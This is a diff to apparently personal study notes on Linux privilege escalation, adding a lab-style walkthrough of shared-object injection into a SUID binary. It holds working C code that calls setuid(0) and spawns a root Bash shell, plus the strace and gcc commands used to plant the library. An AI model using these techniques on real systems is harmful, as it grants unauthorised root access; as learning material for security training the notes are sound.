@@ -56,7 +56,7 @@ A root shell can be spawned by simply executing the rootbash file with the -p co
 
 ##### Custom Executables
 
-There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
+There may be instances where some root process executes another process which you can control. In these cases, the following [[C]] code, once compiled, will spawn a Bash shell running as root:  
 ```
 int main() { 
 	setuid(0); 
@@ -314,6 +314,29 @@ $ chmod + privesc.sh
 - When a program is executed, it will try to load the shared objects it requires. 
 - By using a program called [[strace]], we can track these system calls and determine whether any shared objects were not found.
 - If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.
+
+Example:
+on running the find command mentioned above we find a sus file -> `/usr/local/bin/suid-so`
+run strace to see what's happening in the executable file 
+```
+starce /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+2>&1 this means any errors will be redirected to stdout so that grep will match 
+them as well 
+we find that the script is trying to load a [[c]] file from users home directory if we create this file we can inject code into the process and spawn a root shell
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+	setuid(0); 
+	system("/bin/bash -p"); 
+}
+```
+Compile `libcalc.c` into `/home/user/.config/libcalc.so`
+```
+$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
+```
 
 
 
